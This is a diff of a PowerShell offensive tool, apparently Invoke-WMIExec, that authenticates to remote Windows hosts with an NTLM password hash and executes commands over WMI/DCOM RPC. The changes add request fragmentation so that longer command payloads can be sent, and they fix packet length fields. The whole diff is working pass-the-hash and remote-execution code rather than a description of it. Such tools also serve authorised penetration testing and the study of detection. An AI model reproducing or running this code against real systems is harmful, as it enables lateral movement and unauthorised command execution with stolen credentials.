@@ -189,16 +189,16 @@ function Get-PacketRPCAUTH3()
 
 function Get-PacketRPCRequest()
 {
-    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_object_UUID)
+    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)
 
     if($packet_auth_length -gt 0)
     {
         $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
     }
 
-    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_object_UUID.Length)
+    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
     [Byte[]]$packet_frag_length = $packet_write_length[0,1]
-    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length)
+    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
     [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
     $packet_auth_length = $packet_auth_length[0,1]
 
@@ -215,9 +215,9 @@ function Get-PacketRPCRequest()
     $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
     $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)
 
-    if($packet_object_UUID.Length)
+    if($packet_data.Length)
     {
-        $packet_RPCRequest.Add("RPCRequest_ObjectUUID",$packet_object_UUID)
+        $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
     }
 
     return $packet_RPCRequest
@@ -606,8 +606,8 @@ if($WMI_client_init.Connected)
         $WMI_session_ID = $WMI_client_receive[44..51]
         $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
         $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
-        $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.length - 12)..($WMI_target_details.length - 5)]
-        $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.length;$i += 2){$hash.SubString($i,2)}}) -join "-"
+        $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
+        $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
         $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $auth_hostname = (get-childitem -path env:computername).Value
         $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
@@ -839,8 +839,8 @@ if($WMI_client_init.Connected)
             $WMI_session_ID = $WMI_client_receive[44..51]
             $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
             $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
-            $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.length - 12)..($WMI_target_details.length - 5)]
-            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.length;$i += 2){$hash.SubString($i,2)}}) -join "-"
+            $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
+            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
             $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
             $auth_hostname = (get-childitem -path env:computername).Value
             $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
@@ -978,6 +978,7 @@ if($WMI_client_init.Connected)
             }
 
             Write-Verbose "Attempting command execution"
+            $request_split_index = 5500
 
             :WMI_execute_loop while ($WMI_client_stage -ne 'exit')
             {
@@ -1036,6 +1037,7 @@ if($WMI_client_init.Connected)
                   
                     'Request'
                     {
+                        $request_split = $false
 
                         switch ($sequence_number[0])
                         {
@@ -1217,32 +1219,30 @@ if($WMI_client_init.Connected)
 
                             }
 
-                            8
+                            {$_ -ge 8}
                             {
                                 $sequence_number = 0x09,0x00,0x00,0x00
-                                $request_flags = 0x83
-                                $request_auth_padding = 8
+                                $request_auth_padding = 0
                                 $request_call_ID = 0x0b,0x00,0x00,0x00
                                 $request_context_ID = 0x04,0x00
                                 $request_opnum = 0x18,0x00
                                 $request_UUID = $IPID2
-                                $WMI_client_stage_next = 'Result'
-                                [Byte[]]$stub_length = [System.BitConverter]::GetBytes($Command.length + 1769)
+                                [Byte[]]$stub_length = [System.BitConverter]::GetBytes($Command.Length + 1769)
                                 $stub_length = $stub_length[0,1]
-                                [Byte[]]$stub_length2 = [System.BitConverter]::GetBytes($Command.length + 1727)
+                                [Byte[]]$stub_length2 = [System.BitConverter]::GetBytes($Command.Length + 1727)
                                 $stub_length2 = $stub_length2[0,1]
-                                [Byte[]]$stub_length3 = [System.BitConverter]::GetBytes($Command.length + 1713)
+                                [Byte[]]$stub_length3 = [System.BitConverter]::GetBytes($Command.Length + 1713)
                                 $stub_length3 = $stub_length3[0,1]
-                                [Byte[]]$command_length = [System.BitConverter]::GetBytes($Command.length + 93)
+                                [Byte[]]$command_length = [System.BitConverter]::GetBytes($Command.Length + 93)
                                 $command_length = $command_length[0,1]
-                                [Byte[]]$command_length2 = [System.BitConverter]::GetBytes($Command.length + 16)
+                                [Byte[]]$command_length2 = [System.BitConverter]::GetBytes($Command.Length + 16)
                                 $command_length2 = $command_length2[0,1]
                                 [Byte[]]$command_bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)
 
 
                                 # thanks to @vysec for finding a bug with certain command lengths
                                 [String]$command_padding_check = $Command.Length / 4
-
+                                
                                 if($command_padding_check -like "*.75")
                                 {
                                     $command_bytes += 0x00
@@ -1259,7 +1259,7 @@ if($WMI_client_init.Connected)
                                 {
                                     $command_bytes += 0x00,0x00,0x00,0x00
                                 }
-
+                                
                                 $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                 $causality_ID_bytes +
                                                 0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
@@ -1379,12 +1379,61 @@ if($WMI_client_init.Connected)
                                                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x02,0x00,0x00,0x00,
                                                 0x00,0x00,0x00,0x00,0x00,0x00
+                                
+                                if($Stub_data.Length -lt $request_split_index)
+                                {
+                                    $request_flags = 0x83
+                                    $WMI_client_stage_next = 'Result'
+                                }
+                                else
+                                {
+                                    $request_split = $true
+                                    $request_split_stage_final = [Math]::Ceiling($stub_data.Length / $request_split_index)
+
+                                    if($request_split_stage -lt 2)
+                                    {
+                                        $request_length = $stub_data.Length
+                                        $stub_data = $stub_data[0..($request_split_index - 1)]
+                                        $request_split_stage = 2
+                                        $sequence_number_counter = 10
+                                        $request_flags = 0x81
+                                        $request_split_index_tracker = $request_split_index
+                                        $WMI_client_stage_next = 'Request'
+                                    }
+                                    elseif($request_split_stage -eq $request_split_stage_final)
+                                    {
+                                        $request_split = $false
+                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
+                                        $request_split_stage = 0
+                                        $stub_data = $stub_data[$request_split_index_tracker..$stub_data.Length]
+                                        $request_flags = 0x82
+                                        $WMI_client_stage_next = 'Result'
+                                    }
+                                    else
+                                    {
+                                        $request_length = $stub_data.Length - $request_split_index_tracker
+                                        $stub_data = $stub_data[$request_split_index_tracker..($request_split_index_tracker + $request_split_index - 1)]
+                                        $request_split_index_tracker += $request_split_index
+                                        $request_split_stage++
+                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
+                                        $sequence_number_counter++
+                                        $request_flags = 0x80
+                                        $WMI_client_stage_next = 'Request'
+                                    }
+
+                                }
 
                             }
 
                         }
 
                         $packet_RPC = Get-PacketRPCRequest $request_flags $stub_data.Length 16 $request_auth_padding $request_call_ID $request_context_ID $request_opnum $request_UUID
+
+                        if($request_split)
+                        {
+                            $packet_RPC["RPCRequest_AllocHint"] = [System.BitConverter]::GetBytes($request_length)
+                        }
+
                         $packet_NTLMSSP_verifier = Get-PacketNTLMSSPVerifier $request_auth_padding 0x04 $sequence_number
                         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                         $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier 
@@ -1395,9 +1444,13 @@ if($WMI_client_init.Connected)
                         $WMI_client_send = $RPC + $stub_data + $NTLMSSP_verifier
                         $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                         $WMI_client_random_port_stream.Flush()
-                        $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
-                        
-                        while ($WMI_client_random_port_stream.DataAvailable)
+
+                        if(!$request_split)
+                        {
+                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
+                        }
+
+                        while($WMI_client_random_port_stream.DataAvailable)
                         {
                             $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                             Start-Sleep -m $Sleep
@@ -1409,7 +1462,7 @@ if($WMI_client_init.Connected)
                     'Result'
                     {
 
-                        while ($WMI_client_random_port_stream.DataAvailable)
+                        while($WMI_client_random_port_stream.DataAvailable)
                         {
                             $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                             Start-Sleep -m $Sleep
